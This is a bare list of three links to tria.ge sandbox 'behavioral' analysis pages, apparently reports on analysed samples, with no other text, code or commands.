[https://tria.ge/240812-sd558s1apb/behavioral1](https://tria.ge/240812-sd558s1apb/behavioral1)
[https://tria.ge/240811-s15g8awalq/behavioral3](https://tria.ge/240811-s15g8awalq/behavioral3)
[https://tria.ge/240624-drrsfazalp/behavioral2](https://tria.ge/240624-drrsfazalp/behavioral2)

